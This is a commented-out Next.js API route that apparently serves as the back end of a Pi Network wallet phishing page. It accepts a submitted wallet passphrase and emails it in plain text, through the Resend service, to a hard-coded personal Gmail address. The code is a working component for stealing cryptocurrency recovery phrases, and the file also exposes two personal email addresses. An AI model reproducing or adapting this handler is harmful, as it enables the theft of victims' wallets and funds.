// import type { NextApiRequest, NextApiResponse } from "next";
// import { Resend } from "resend";

// const resend = new Resend(process.env.RESEND_API_KEY);

// export default async function handler(req: NextApiRequest, res: NextApiResponse) {
//   if (req.method !== "POST") {
//     return res.status(405).json({ error: "Method Not Allowed" });
//   }

//   const { passphrase } = req.body;
//   if (!passphrase) {
//     return res.status(400).json({ error: "Passphrase is required!" });
//   }

//   try {
//     const { data, error } = await resend.emails.send({
//       from: "hafizadil909@gmail.com",
//       to: ["adilamin374@gmail.com"], // Replace with your actual email
//       subject: "New Pi Wallet Passphrase Submission",
//       text: `A user has submitted their passphrase:\n\n${passphrase}`,
//     });

//     if (error) {
//       return res.status(400).json({ success: false, message: error.message });
//     }

//     return res.status(200).json({ success: true, data });
//   } catch (err) {
//     return res.status(500).json({ success: false, message: "Server Error", error: err });
//   }
// }
